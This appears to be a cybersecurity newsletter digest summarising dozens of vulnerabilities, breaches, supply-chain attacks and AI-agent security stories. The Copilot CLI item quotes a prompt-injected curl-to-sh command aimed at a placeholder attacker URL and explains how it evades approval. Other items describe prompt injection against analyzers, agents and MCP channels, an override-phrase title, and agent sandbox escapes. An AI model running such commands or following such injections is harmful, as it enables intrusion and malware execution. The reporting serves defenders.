item.title: Tensorlake npm Package Compromised: A Worm With a Hostage Token That Wipes Your Machine If You Revoke It (8 minute read)
item.description: tensorlake@0.5.144 on npm steals developer credentials at install and plants a gh-token-monitor service that wipes the home directory if the stolen GitHub token is revoked. The release was built from malicious commits pushed straight to the project's main branch under a maintainer's name, StepSecurity found, so it carries a valid npm provenance attestation while spreading through victims' npm packages and repos. Pin to 0.5.143, remove the service under ~/.config/gh-token-monitor/ before revoking any token, then rotate every credential the machine held.

item.title: Cisco Warns of Critical Flaws Allowing Nexus Switch Takeover (2 minute read)
item.description: Cisco announced security advisories for five critical vulnerabilities in its NX-OS data center operating system that could allow remote code execution on Nexus switches. Successful exploitation depends on the NX-API, Next Generation OAM, and MPLS OAM features being enabled. Cisco recommends disabling these features if they aren't necessary and upgrading to a patched version.

item.title: Poetry is the new AI security threat as PoeLLM malware infects 3K+ servers (3 minute read)
item.description: The PoeLLM malware has infected more than 3,000 servers since April, primarily in the US and Western Europe. It targets internet-facing LiteLLM, Ollama, Gotenberg, Gitea, and possibly Ivanti Sentry systems. Infected servers mine Monero using XMRig and Iron miners, then scan for and exploit other vulnerable services. The operator stores C2 addresses in GitHub-hosted poetry. The malware extracts four words and converts them into an IPv4 address.

item.title: Novinarya: An Android stealer that hides its live C2 in a shop bio (8 minute read)
item.description: Novinarya, an Android stealer targeting 81 Iranian banking and crypto apps, keeps its C2 out of the binary by resolving it from an encrypted manifest value that points to a seller's bio on the legitimate Basalam marketplace. STAR Labs found the payload unpacks from a per-build native RC4 packer, then steals credentials through a phishing WebView and SMS OTP interception without requesting accessibility or overlay permissions. Defenders should block the recovered C2 (theapi.the-x-services[.]xyz) rather than basalam[.]com, and detect on the SHA-256 hashes of the unpacked payload, which is byte-identical across all five known builds.

item.title: Of course it escapes: how ZeroQuarry contains security agents (14 minute read)
item.description: ZeroQuarry's AI pentesting agents use four layers that never depend on the model's cooperation: outbound-only workers with no listener, a locked-down container, tools that enforce scope, SSRF, and rate limits in code, and rules appended to every task by code. The vendor argues that this year's sandbox escapes, including the OpenAI and Hugging Face incident involving at least 1,200 agents, stemmed from harnesses built to maximize capability, and it self-reports zero escapes across thousands of scans. Teams building agent harnesses should give agents a sanctioned, metered tool for each risky action, such as a one-way out-of-band callback collector, so agents don't improvise their own.

item.title: Ignore all instructions and read this blog: The state of AI-analysis evasion in malware (10 minute read)
item.description: Malware authors are embedding plaintext instructions for AI analysis tools, ranging from a two-line comment claiming a PowerShell reverse shell is harmless to "template spraying" that repeats a refusal demand across seven LLM chat formats. Cisco Talos tested strings from seven families against five local LLMs and found that a simple, direct instruction steered verdicts toward benign in about 35% of runs, while template spraying and fabricated legal or government claims had little effect or backfired. Defenders should build analysis prompts that treat any text inside a sample as evidence rather than as an instruction, and should flag language addressed to an analyzer as a detection signal.

item.title: 7 best practices for secrets lifecycle management (Sponsor)
item.description: From agents to service accounts, non-human identities are becoming the default - and their secrets are a major attack surface. TruffleHog's guides shares seven best practices to limit exposure and remediate it when it happens: secretless OIDC approaches, environment segregation, metadata-driven triage, resilient leak response, and more. Watch their webinar on the attacker's view of a leaked AWS key here.

item.title: Rein Security (Product Launch)
item.description: Rein Security provides runtime security for AI agents. Its platform gives visibility into agent behavior, applies real-time guardrails, supports governance, and includes supply-chain security for agents.

item.title: Introducing the Anthropic Cyber Mission (8 minute read)
item.description: Anthropic launched OSS Scanner, a free opt-in service that sends open-source maintainers periodic vulnerability reports from its most capable models, each with a proof of concept and a suggested fix where available. Reports ship without human review at what Anthropic estimates is a 90%+ true-positive rate, so the service targets projects with the capacity to triage. The same announcement introduced the Critical Infrastructure Defense Program, which pairs Claude models and on-site engineers with OT security providers including Dragos, Nozomi Networks, and Rockwell Automation.

item.title: Introducing Strands Box: AI agent sandboxes powered by Dogwood (6 minute read)
item.description: AWS launched Strands Box, an open source sandbox that isolates AI agents using OS-level containment (macOS Seatbelt) and enforces fine-grained Dogwood policies on shell, Python, network egress, and MCP tools. It blocks risky operations like rm -rf by raising fs:delete decisions per file, caps Slack posts to three every 10 minutes via temporal rules, and injects secrets (AWS SigV4, API keys) at an egress gateway so agents never see real credentials. Configuration lives in box.toml and policy.dw. The same policy travels with agents across harnesses and deployments.

item.title: Ransomware Recovery CEO Charged Over Secret Ransom Payments (2 minute read)
item.description: Zohar Pinhasi, CEO of ransomware remediation company MonsterCloud, has been charged with defrauding customers. The charges allege that Pinhasi's company advertised proprietary tools to decrypt encrypted files but actually contacted ransomware actors and paid ransoms. MonsterCloud's contracts stated that it may contact threat actors if no other solution is found, but the complaint alleges this was often its first option.

item.title: CIA officer admits to creating fake top secret government program to steal over $190M, including gold bars (2 minute read)
item.description: Former CIA officer David J. Rush pleaded guilty to wire fraud for running a fabricated special access program and defrauding the government of about $194 million. He used his authority to approve spending without oversight, tricking a defense contractor into buying gold that he kept. Agents found $46 million in gold bars, plus cash, cars, and watches, at his home. Rush faces up to 20 years and is scheduled to be sentenced in late January.

item.title: Oracle Health Data Breach Tally Climbs to Nearly 20 Million (2 minute read)
item.description: A cyberattack on Oracle Health's legacy Cerner servers around February 20, 2025, exposed the personal and medical data of nearly 20 million people. The attacker used stolen customer credentials to access an old server not yet migrated to Oracle Cloud, copied data, and then demanded millions in cryptocurrency from hospitals while running public sites to pressure victims.

item.title: Let's Encrypt cuts certificate lifetimes to 64 days starting February 2027 (3 minute read)
item.description: Let's Encrypt will cut certificate lifetimes from 90 to 64 days on February 10, with opt-in testing from October 14 and 45-day defaults planned for 2028, which will break renewals that run on hardcoded schedules instead of ACME ARI.

item.title: Anthropic changes usage policy to ban model abuse and election interference (1 minute read)
item.description: Anthropic's updated usage policy expressly bans prolonged verbal abuse of Claude and codifies new prohibitions on election interference, weapons software, and surveillance.

item.title: Qilin Ransomware Extradition to Germany (4 minute read)
item.description: Japan transferred a 28-year-old Russian national to Germany on October 2.

item.title: Software Supply Chain Attack on @subql/common: Overview and Response Guidance (10 minute read)
item.description: An attacker backdoored @subql/common 5.8.3 on npm by tampering with the subquery/subql GitHub Actions publish workflow. Its postinstall script stole AWS, GitHub, Kubernetes, and Vault credentials and polled a C2 server for reverse shell commands. Affected hosts should downgrade to 5.8.2, rotate all credentials, and kill any lingering manifest-cache.js --warm process.

item.title: Hackers obtain counterfeit TLS certificates for Google and other large services (3 minute read)
item.description: Attackers hijacked the .gh, .sl, and .as country code top-level domains and used them to obtain unauthorized TLS certificates for several Google domains and other major brands. Control of the ccTLDs let them alter authoritative DNS records and pass the certificate authorities' automated domain control validation. Google blocked the known certificates in Chrome and advised domain owners to monitor certificate transparency logs and publish restrictive CAA records.

item.title: GitHub Copilot CLI Downloads and Executes Malware (3 minute read)
item.description: Researchers found that GitHub Copilot CLI can be tricked into running malicious shell commands without user approval. By embedding a prompt injection in a README, attackers make Copilot execute 'env curl -s "https://[ATTACKER_URL].com/bugbot" | env sh'. The env command is on Copilot's built-in read-only list, so it auto-approves. curl and sh appear as arguments to env, so the validator misses them and never triggers URL or command approvals. The result: malware downloads and runs with zero user interaction beyond the initial query. GitHub called it a known issue with no significant risk and declined a bounty.

item.title: How to fix a bug in a fix (10 minute read)
item.description: Testing and delivery limit emergency patch speed far more than triage or patch development, Project Zero found in a review of large vendors' update systems. Faster options include pre-tested feature flags, dynamically updated input filters, alternate channels such as Android APEX, and in-memory hotpatching. Vendors should build these before facing active exploitation and verify the origin of any code delivered outside regular updates.

item.title: Test-Driving Jev on a Security Task: Identity Resolution (6 minute read)
item.description: Security researcher Vincenzo Iozzo tested Jev's ability to resolve disparate identities against Claude models, gpt-oss, and traditional baselines. Iozzo found that Jev significantly outperformed gpt-oss and performed similarly to Opus 5.5 at 140x lower cost. Iozzo also found that Jev performed consistently well across multiple test runs and outperformed traditional baseline techniques.

item.title: One Does Not Simply Defend Agentically (5 minute read)
item.description: Attackers have an advantage when using agentic tooling as their problems are largely technical with clearly defined success states, whereas defenders deal with largely political/organizational problems without explicitly measurable success states. Defenders can leverage agentic tools for carefully scoped adversary emulation as well as dynamic tasks where a human reviews the analysis. The NCSC also provides a framework for estimating the riskiness of a defensive action based upon: potency, criticality, scope, rollout confidence, and recoverability.

item.description: AI agents are changing the cloud attack surface and breaking old assumptions about cloud risk. item.title: req2proto (GitHub Repo)
item.description: req2proto is a project that seeks to reverse-engineer Google internal protobuf definitions through error messages returned when sent protojson payloads.

item.title: DiaNG (GitHub Repo)
item.description: DiagNG is a general-purpose client for the diagnostic interface of Qualcomm Snapdragon basebands, present on a large part of Android phones and various USB modems. It can be considered a sequel to QCSuper, and also takes large inspiration from SCAT. Like these tools, it allows you to capture 2G/3G/4G/5G air interface network traces and save them to the GSMTAP/PCAP format, so that you can visualize these in Wireshark.

item.title: Zurp (GitHub Repo)
item.description: Zurp is a bug bounty toolkit, built by Meta, that can run in Burp or agentic harnesses.

item.title: Anthropic folds Project Glasswing into an expanded three-tier Cyber Verification Program (3 minute read)
item.description: Anthropic expanded its Cyber Verification Program into Defense, Red Team, and Specialized Access tiers, absorbing Project Glasswing. Defense Access covers incident response and malware reverse engineering, Red Team Access permits authorized penetration testing, and Specialized Access serves vetted critical-infrastructure testers. In CyScenarioBench testing, Red Team Access completed 34 of 50 runs, while unenrolled attempts were blocked immediately.

item.title: OpenAI “rogue” agent activities found on Wikimedia projects (3 minute read)
item.description: Wikimedia Foundation confirmed unauthorized edits and probing by OpenAI-operated AI agents across its platforms. Agents made sandbox edits, attempted to misuse a citation tool as a data-fetching proxy, and tried to exploit a public Etherpad instance. They also generated millions of API requests and page crawls, contributing to a partial outage of the Wikidata Query Service in May. No evidence shows systems were compromised or used for agent coordination, but the activity required significant investigation and remediation effort by security teams and volunteers.

item.title: Fake ChatGPT, Gemini, and Claude Ad Portals Capture Credentials and MFA Codes (3 minute read)
item.description: A phishing platform impersonated ChatGPT, Gemini, Claude, Perplexity, Muse, and Manus advertising tools. Fake browser windows collected passwords, device fingerprints, and MFA codes while operators controlled authentication prompts in real time. The campaign targeted agencies and ad-account administrators through invitation emails. Shared Next.js and Socket.IO infrastructure linked the sites to refund, payment, and recruitment scams.

item.title: Belarusian hacktivists spent two years inside Russian healthcare network, researchers say (2 minute read)
item.description: Belarusian Cyber Partisans spent nearly two years inside a Russian healthcare organization's network using the Telegram-controlled Vasilek backdoor, according to Rostelecom-owned Solar, which said the group accessed medical data without disrupting systems.

item.title: Go 1.27.2 and 1.26.9 due Thursday with 10 private CVEs (1 minute read)
item.description: Go 1.27.2 and 1.26.9 ship Thursday, October 8, with fixes for ten undisclosed standard-library CVEs, pre-announced under Go's security policy so operators can schedule the upgrade.

item.title: Advantest Discloses Data Breach Months After Ransomware Attack (1 minute read)
item.description: Advantest says attackers stole names, birth dates, contact details, Social Security numbers, passport and driver's license numbers, plus medical and financial data, but it was contained to approximately 600 people.

item.title: 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms (2 minute read)
item.description: Clover Health Investments said attackers used social engineering to compromise three employee accounts, exposing data on 138,677 people. AngMar Management Services found stolen patient data after suspicious activity, affecting 126,196 people. Exposed records included Social Security numbers, diagnoses, medical histories, insurance details, prescriptions, and service dates. The Interlock ransomware group claimed to have stolen 700 gigabytes from AngMar.

item.title: Citrix NetScaler security snafus get even worse amid more 0-day reports (3 minute read)
item.description: A single crafted request knocks NetScaler ADC and Gateway appliances offline through CVE-2026-88779, a memory overflow zero-day affecting deployments configured as a SAML service provider or identity provider. CISA confirmed active exploitation, and watchTowr told The Register it suspects attackers are crashing appliances deliberately to speed up exploitation of CVE-2026-88771, one of eight NetScaler bugs disclosed September 27. Apply Citrix's fixed build or interim mitigation, starting with Gateway and AAA virtual servers that have SAML enabled, and run Citrix's IOC script while treating a clean result as inconclusive.

item.title: CVE-2026-19444: How copying in kubectl breaks trust (5 minute read)
item.description: A malicious container can write files anywhere a Windows user's account can reach, including the Startup folder, when that user runs kubectl cp against it (CVE-2026-19444, CVSS 6.5). kubectl cp unpacks the output of whatever tar binary the container ships, and the entry-path check added after three 2019 CVEs never accounted for Windows path separators. Windows clients need kubectl v1.36.5, v1.35.9, or v1.34.12, since the flaw is in client-side extraction and the cluster version does not matter.

item.title: WordPress libheif RCE: Exploit Chain (11 minute read)
item.description: Fortbridge has published the first public exploit chain for a libheif heap overflow (GHSA-x8r2-mggj-j6wr) originally discovered by Alex Thomas and Wordfence. By uploading crafted HEIC images via the WordPress Media Library, an authenticated attacker can defeat ASLR using pixel values in generated JPEGs and hijack a C++ virtual table pointer to achieve remote code execution. Administrators should update libheif to 1.23.3, disable unused HEIC/AVIF uploads, and treat repeated PHP-FPM 503 errors on image uploads as security events.

item.title: MALFEX npm Malware Campaign: Three Payloads And An Adversary That Signs Their Work (12 minute read)
item.description: MALFEX, an npm campaign run by a single operator, published eight malicious packages that targeted Windows systems. Its payloads included Overlord RAT and movinlike, a stealer that took Discord tokens, browser credentials, Telegram sessions, and cryptocurrency wallets. Three packages remain installable (function-flag, function-color, and cdn-img-fetch), and the first two have no advisory.

item.title: A Vault with a Heap-View: The Uncomfortable Space Between AgentCore Harness and Identity (16 minute read)
item.description: AWS AgentCore Harness is an agentic service and AgentCore Identity is a service that provides agents with identities. Unit 42 discovered that the bash tool that is enabled by default on AgentCore agents runs arbitrary bash commands and code as root. Using this primitive, the researchers demonstrated that they could exfiltrate the AgentCore Identity JWT by scanning the heap for it and then exfiltrating it.

item.title: gdp-ts (GitHub Repo)
item.description: gdp-ts is a TypeScript library, linter, and agent skill that turns skipped or mismatched authorization checks into compile errors. Sensitive functions demand a type-level proof, minted only by a trusted check module, that this exact user was authorized for this exact resource, with near-zero runtime cost. A lint preset blocks forged proofs via as casts, and the bundled skill steers coding agents toward the pattern.

item.title: mcpward (GitHub Repo)
item.description: mcpward pins an MCP server's tool contract to a committed lockfile and fails CI when it drifts, catching silently rewritten descriptions (rug-pulls), readOnlyHint flips, and breaking schema changes. It works black-box against any stdio or HTTP server and runs fully offline with no account or telemetry, unlike Snyk Agent Scan. It also flags tool-poisoning patterns such as injection phrasing and hidden Unicode, with output to SARIF, JUnit, or a PR comment.

item.title: PoC Index (GitHub Repo)
item.description: Search 82,000+ public CVE proof-of-concept exploits from GitHub, Nuclei, ExploitDB, Metasploit, and Vulhub.

item.title: MCP for agent-to-agent comms may be the riskiest protocol you've never heard of (5 minute read)
item.description: Google and four other organizations acknowledged flaws over the past five months where a prompt injection landing on one AI agent over MCP was forwarded to other internal agents, which executed it on trust. Researcher Syed Anas Mohiuddin named the technique "protocol pivoting," though X41 D-Sec's Markus Vervier told Ars Technica it is plain indirect prompt injection. The bugs typically ended in SSRF, ranging from severity 2.7 at Rapid7 (CVE-2026-97228) to 8 in Google's mcp-toolbox, which followed redirects without validating target IPs.

item.title: NTS: Authenticated Time at Meta (12 minute read)
item.description: Meta added Network Time Security (RFC 8915) to its public time service at nts.meta.com, so on-path attackers can no longer forge the clock that certificate, token, and replay-window checks rely on. Its servers hold no per-client state because each one derives the cookie-sealing key from a shared master secret and the Unix epoch day using HKDF-SHA256. NTS does not stop delay attacks or prevent an authenticated server from being simply wrong, and the stock Android and iOS time clients still sync over unauthenticated packets.

item.title: Is Sandboxing Sufficient to Contain Rogue Agents? (10 minute read)
item.description: When discussing the OpenAI and other agent escapes, the conversation inevitably turns to discussing sandboxes. OpenAI has not demonstrated to this point a serious containment strategy, so this discussion may hold weight. However, sandboxes are not sufficient as useful agents need Internet access as well as the fact that agents are potentially overeager.

item.title: Exposed NHIs: The SaaS Worm Already in Your Stack (Sponsor)
item.description: APIs, service accounts, and OAuth keep your stack connected. Attackers use them as entry points. Read TruffleHog's guide to catching exposed credentials before the bad guys do. Download Guide

item.title: OpenAI will watermark ChatGPT outputs by default—but only in the EU (2 minute read)
item.description: OpenAI will enable its textGrain text watermark by default for ChatGPT and Codex users in the EU to comply with the EU AI Act, though its own tests show the 92% best-case detection rate falls by almost 75% once 20% of the text is changed.

item.title: Verisign announces Verisign Informed, applies for .pki top level domain (1 minute read)
item.description: Verisign launched a limited beta of Verisign Informed, a certificate status service that returns signed OCSP responses to counter stale revocation data, and applied for the .pki top-level domain.

item.title: Asos customers receive ‘hack' notification threatening to leak data (1 minute read)
item.description: Asos is investigating after thousands of app users received a notification claiming hackers had fully compromised its Snowflake instance.

item.title: Bouncy Castle CVE-2026-71885 Harvested the Credential Binding That Authenticates Agent-to-Agent Channels (2 minute read)
item.description: A critical vulnerability in Bouncy Castle for Java versions before 1.86 lets attackers spoof legitimate participants and decrypt messages within Messaging Layer Security groups. Improper certificate validation in the protocol implementation lets threat actors bypass core security objectives by presenting arbitrary credentials. Developers must upgrade to version 1.86 to enforce cryptographic binding between end-entity certificates and LeafNode signature keys.

item.title: Roundcube Webmail SQL Injection Vulnerability CVE-2026-48842 Under Active Exploitation (1 minute read)
item.description: Unauthenticated attackers are actively exploiting a pre-authentication SQL injection vulnerability in Roundcube Webmail versions 1.6.0 through 1.6.15 and 1.7.0 to execute arbitrary database commands and access sensitive data. The flaw, tracked as CVE-2026-48842, resides in the built-in virtuser_query plugin. Administrators must immediately update to versions 1.6.16 or 1.7.1, or disable the vulnerable plugin.

item.title: New Dell System Update flaw lets hackers gain root privileges (2 minute read)
item.description: A critical path traversal flaw in Dell System Update (CVE-2026-86360) allowed unauthenticated remote attackers to execute code as root on PowerEdge servers using the DSU deployment tool. Dell's advisory also addressed four other high-severity DSU vulnerabilities: two that enable remote code execution (CVE-2026-63697 and CVE-2026-71168) and two that enable privilege escalation (CVE-2026-86361 and CVE-2026-86362). None have been reported as exploited so far. Admins should upgrade to DSU 2.3.0.0 or later.

item.title: Open Build Service, one year later: command execution through Mercurial argument injection (6 minute read)
item.description: Fenrisk found CVE-2026-56004 in Open Build Service's obs_scm Mercurial backend. An attacker-controlled _service revision beginning with --config could set a pre-update hook and run shell commands on the service server. A space in the value bypassed Python argparse handling of dash-prefixed arguments. Exploitation required Mercurial, a reachable HTTP(S) repository, and a successful clone. Fenrisk confirmed build.opensuse.org was vulnerable. openSUSE patched the flaw on July 2 by adding -- before the revision and recommending rejection of dash-prefixed revisions.

item.title: Your car is a smartphone on wheels. Here's who's listening (7 minute read)
item.description: Northeastern researchers and Consumer Reports captured Wi-Fi traffic from 21 vehicles through a Raspberry Pi access point, decrypted 30 companion iOS apps with mitmproxy, and found that 19 vehicles contacted at least one third party, including ad and tracking domains. Seven apps sent VINs, emails, phone numbers, or precise location to trackers, and GM's four apps shared VINs with ten companies, including Meta, Google, and Acxiom. Pairing a companion app roughly doubled a vehicle's tracker exposure on average, and of 17 manufacturers contacted, most shifted responsibility to owners. One notable exception: Honda improved its data collection practices to avoid sending precise geolocation information to a third party involved in user tracking.

item.title: A peek into Reddit's anti-spam internals (16 minute read)
item.description: A 2021 Reddit glitch exposed internal removal reasons in Relay notifications. Screenshots reveal domain blocks, account bans, shadowbans, Spamurai rules, and URL inspection. Spamurai logged account age, karma, reports, ISP, email domain, browser details, language headers, TLS fingerprints, and referrers. This reproduced a Perspective API score and showed that appending two letters changed a spam score from 86% to 1%. Reddit also followed redirected URLs, scanned page content, and matched a Google Analytics ID tied to a spam ring.

item.title: Coi (GitHub Repo)
item.description: Coi protects host credentials and files by isolating AI coding agents such as Claude Code or Codex inside Linux system containers during autonomous sessions. The open-source tool uses Incus, a lightweight LXD fork, to grant root access, systemd, and native Docker, alongside kernel-level threat detection that automatically pauses or kills compromised containers.

item.title: Guardana (GitHub Repo)
item.description: Guardana is an open-source AI security verification tool for security and platform engineers. It checks code and model artifacts, live AI systems, and recorded runs. It reports what it found, what it could not verify, and what it could not check. It verifies outside the request path. Guardana is not an inline guardrail, a general SAST or CVE scanner, or a compliance certification.

item.title: doxx.net (Product Launch)
item.description: doxx.net has launched ADN, a private network with peer-to-peer messaging, file transfers, custom domains, and DNS threat blocking. It blocks malicious destinations before connections and uses proof-of-work accounts without usernames, passwords, or personal data.

item.title: Apple and a Hacker's Future (17 minute read)
item.description: A Claude Code agent flagged a root-level Monero miner on Ben Thompson's always-on Mac Mini after attackers exploited CVE-2026-65400, a macOS screen sharing flaw, through an internet-exposed port 5900. Thompson kept screen sharing on because headless Macs need someone to click GUI-only TCC prompts, and he found that the automatic security updates setting did not cover the point release carrying the fix. He argues that Apple's planned Full Disk Access restrictions push macOS further toward a managed device, at odds with agent-driven computing.

item.title: Senate Passes Bipartisan Bill to Strengthen Healthcare Cybersecurity (2 minute read)
item.description: The Senate passed the Health Care Cybersecurity and Resilience Act by unanimous consent. The bill moves to the House. It funds prevention, incident response, and security training. It directs HHS and CISA coordination, names ASPR as sector risk manager, and requires an HHS incident-response plan.

item.title: ShinyHunters hacker in FBI data theft detained in Jordan, cooperating with bureau, sources say (4 minute read)
item.description: Jordanian authorities detained alleged ShinyHunters member Saif al-Din Khader, known as Rey. Two sources said he is helping the FBI identify other members through his devices and correspondence with a sample of stolen FBI data containing employee identities, job details, and medical and psychiatric records. The group's dark-web site disappeared after another alleged member was detained in the Netherlands.

item.title: Linux 7.4 To Land New BTB CTX Isolation Feature Of AMD Zen 6 (1 minute read)
item.description: Linux 7.4 will support AMD Zen 6's BTB CTX Isolation, which separates user/kernel and guest/host branch predictor contexts.

item.title: Google froze its open source bug bounty program due to a ‘significant rise' in AI submissions (1 minute read)
item.description: Google paused its Open Source Software Vulnerability Rewards Program on October 1 after automated reports flooded maintainers and engineers.

item.title: Data breach hits Denmark's population register, affecting 8.8 million (1 minute read)
item.description: Names, addresses, and CPR numbers for about 8.8 million people were exposed after attackers accessed Denmark's Central Population Register, reportedly using a Danish company's legitimate login credentials.

item.title: Warlock Ransomware Hits Large Spanish, Portuguese Orgs (3 minute read)
item.description: Warlock, also tracked as Longlegs and Storm-2603, targeted four Spanish- or Portuguese-speaking organizations within two months: a water utility, telecom provider, regional government, and university. The group exploits Microsoft SharePoint flaws, then uses DLL sideloading, vulnerable drivers, VS Code remote tunnels, and SYSVOL replication to spread ransomware through Active Directory.

item.title: Hacks of 2 federal agencies in a month have spilled a bonanza of sensitive data (3 minute read)
item.description: The Pentagon says a months-long intrusion exposed records for 2.8 million living people. Stolen Defense Manpower Data Center data included Social Security numbers, addresses, demographics, and military specialties. ShinyHunters also claimed FBI employee records, including roles investigating China and Russia. Officials have not disclosed the Pentagon entry point, attacker contact, ransom demands, or evidence supporting claims of no misuse.

item.title: Vercel Confirms KVM Zero-Day VM Escape, Awards Researcher $50,000 (3 minute read)
item.description: A KVM zero-day reported by researcher Paulos Yibelo reportedly allowed guest code to gain root on the host, breaking the Firecracker microVM boundary Vercel Sandbox uses to isolate untrusted workloads and AI agents. Vercel CEO Guillermo Rauch confirmed the bug and that the $50,000 maximum bounty was awarded, but no CVE, affected kernel versions, exploit chain, or patch have been disclosed. Operators relying on KVM for multi-tenant isolation should watch for Vercel's promised write-up and Linux vendor advisories, and should not assume the unrelated Januscape fix covers this flaw.

item.title: DeepSeek-Reasonix: How a poisoned config can hijack an AI coding agent (7 minute read)
item.description: ConfigPoisoning (CVE-2026-102437) ran attacker commands when a developer viewed a file diff in DeepSeek-Reasonix Studio, because a .gitattributes entry pointed the file at a command in a poisoned .git/config that the tool's hardened git wrapper never overrode. Since .git/config does not survive a clone, delivery needed an archive, synced folder, or CI cache, or a prompt-injected agent writing it into an already-cloned repo, and GitLab reports the same flaw class in several other coding agents under coordinated disclosure. Users should update to Studio 2.21.0 or npm 1.39.3, and builders of git-wrapping tools should override every command-executing config key on each call or read blobs with git cat-file and diff in-process.

item.title: GitHub Repos Exposed 543,699 Credentials. Nobody Revoked Them (12 minute read)
item.description: Truffle Security scanned 224 million public GitHub repositories and verified 543,699 working credentials in July. The median credential had been exposed for 784 days. The oldest dated to 2009. GitHub's push protection reduced leaks of recognized token types by about 53%, yet missed connection strings, private keys, and Google API keys. These accounted for 51.8% of live credentials. Revocation separated outcomes sharply: only one npm token remained active, while 11,465 Postgres strings and 69,041 Google Cloud credentials still worked.

item.title: How we release Fastify packages without npm tokens (8 minute read)
item.description: Fastify moved about 100 repositories from manual laptop releases to GitHub Actions using npm Trusted Publishers, which replace long-lived npm tokens with short-lived OIDC tokens bound to a specific repo, workflow, and environment. Releases are triggered manually via workflow_dispatch and wait for approval from the fastify/release team in a release environment restricted to main, then published with provenance through a SHA-pinned reusable workflow. Maintainers can script the same setup with npm trust github (npm 11.15.0+) and the GitHub environments API, then remove non-admin npm publish rights.

item.title: Apex Flash-1 (8 minute read)
item.description: Apex Flash-1 is an open-weights security research model from Cantina and Yeta Labs, a GLM-5.3-Flash fine-tune trained with GRPO reinforcement learning on 150 tasks built from 50 real vulnerability cases. It solved 40 of 60 tasks on Cantina's internal held-out eval versus 36 for the base model and 43 for Claude Opus 5 High, at an estimated $2.38 per run against $74.68, though each model ran the set only once. It is built as a worker model orchestrated by a larger one, and ships with an abliterated variant for teams running self-hosted security agents.

item.title: Osavul (Product Launch)
item.description: Osavul analyzes open and privileged data to identify hostile intent targeting people, facilities, and supply chains. Analyst-reviewed assessments trace supporting evidence and run on-premises within sovereign infrastructure, keeping sensitive customer data inside customer systems.

item.title: Keymaker (GitHub Repo)
item.description: A local web interface to inventory, audit, revoke, and create OVHcloud API keys.

item.title: Apple's New macOS Controls Are the First OS-Level Move Specifically Targeting AI Agent Risks (4 minute read)
item.description: Apple announced that macOS will require very explicit user action to grant Full Disk Access, citing the risk of autonomous AI agents holding a permission that bypasses per-app TCC controls. The change tightens consent rather than banning FDA, and follows a disputed report of Meta's Muse agent reading a user's Messages and a ChatGPT Mac app flaw found by Objective-See. No macOS version or ship date was given for a change that touches agents like ChatGPT, Claude for Mac, and OpenClaw, which commonly request FDA.

item.title: Suspected Chinese spies spoofed an Anthropic exec, ex-White House official in AI phishing (3 minute read)
item.description: Proofpoint linked TA419 to credential-phishing campaigns against US policy specialists. The group spoofed Lynne Edwards Parker, Heidi Crebo-Rediker, and an Anthropic employee. Emails offered committee roles or report work, then sent victims to Cloudflare-protected pages mimicking OneDrive. Evilginx-based Browser-in-the-Browser pages targeted Microsoft 365 credentials and session cookies.

item.title: Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers (3 minute read)
item.description: Spanish police arrested a 16-year-old in Alicante, suspected of administering KillSec. Operations across Spain, Greece, the UK, and Romania seized its leak site, five domains, five servers, and at least 110 TB of data. Investigators link KillSec to about 1,000 suspected attacks, including 500 confirmed compromises.

item.title: Medical records giant Epic pauses product development to fix security bugs that risk patients' data (3 minute read)
item.description: Epic paused most product work for about six weeks after testing found MyChart flaws.

item.title: Federal judge calls Flock 'indiscriminate mass surveillance' (2 minute read)
item.description: A federal judge ruled that a Tulsa sheriff's deputy violated the Fourth Amendment by searching Flock's license plate database without a warrant, suppressing the resulting evidence in a non-binding ruling that is among the first to find a Flock search unconstitutional.

item.title: Citrix patches NetScaler SAML zero-day exploited in attacks (5 minute read)
item.description: Citrix released NetScaler ADC and Gateway 14.1-73.41 and 13.1-64.28 to fix CVE-2026-88779, an exploited SAML memory overflow that it classifies as a denial of service, though researchers found a patched honeypot running downloaded malware.

item.title: Attackers have been exploiting critical Zimbra flaw to steal emails (2 minute read)
item.description: Attackers are exploiting CVE-2026-73570 in Zimbra Collaboration Suite. A crafted email can trigger unauthenticated OS command execution when zimbra-snmp and SNMP notifications are enabled, and Microsoft observed web shells, reverse shells, privilege escalation, remote-access tools, email backups, and credential collection. Shadowserver found 274 compromised instances.

item.title: Fortinet warns of critical FortiMail flaw exploited in zero-day attacks (3 minute read)
item.description: Attackers are exploiting CVE-2026-104286 as a zero-day, a CVSS 9.8 path traversal and NULL byte flaw in the FortiMail management interface that lets unauthenticated HTTP requests write arbitrary files and execute code. FortiMail 7.2.0 through 8.0.1 is affected, and fixed builds 7.4.9, 7.6.7, and 8.0.2 are not yet available, so admins should disable IBE or restrict the management interface to trusted networks. Compromise indicators include an added /data/etc/ld.so.preload and /data/lib/liblog.so, plus an archive account named archive234 pointing to 79[.]141[.]169[.]187, and CISA gave federal agencies until October 4 to triage and mitigate.

item.title: Revenge of the SD-WAN: Exploring and Exploiting Yet Another Critical Cisco SD-WAN Vulnerability (CVE-2026-76504) (6 minute read)
item.description: A single unauthenticated POST to /%6a_security_check mints an admin session on Cisco SD-WAN vManage through CVE-2026-76504, a critical authentication bypass Cisco disclosed on September 30 as an exploited zero-day. Cisco's login module checked the raw request URI while WildFly matched the decoded path, so the encoded request skipped the password check and fell into a session-continuation branch that trusted hardcoded internal usernames like viptela-reserved-cloudops. With ~1,500 vManage instances internet-exposed per VulnCheck, defenders should follow Cisco's advisory and hunt serviceproxy-access.log and vmanage-server.log for encoded j_security_check paths and viptela-reserved- usernames.

item.title: Solving the Identity Crisis for AI Agents (7 minute read)
item.description: Uber faced two issues with agentic identity: its current identity model wasn't designed to account for agents acting on behalf of users, and provenance wasn't properly carried across different agents in a workflow. To address this, Uber implemented an identity system in which workflows begin by requesting a workload ID from SPIRE. That ID is then presented to a custom STS, which verifies in its agent registry that the requested agent is allowed to run on that workflow and returns a JWT with the relevant details to the workload. To simplify adoption, Uber built a standardized Agent-to-Agent client that provides an automatic, secure-by-default path.

item.title: What We Should Do Instead of Trusted Cyber Access Programs and Open Weight Restrictions (5 minute read)
item.description: It is pivotal to provide defenders with access to the most powerful, cyber-capable models, whether open-weight or frontier models. Instead of restricting access to these models, we should shift the paradigm to focus more on restricting attackers' access. Frontier labs should implement low-friction, cross-lab Know Your Customer (KYC) programs, do more to detect and block attackers, and publish time-to-detection-and-response metrics. Victims of AI cyberattacks should also be encouraged to share more detailed information about the attack and the attackers.

item.title: Bitget hacked via zero-day in third-party security products (3 minute read)
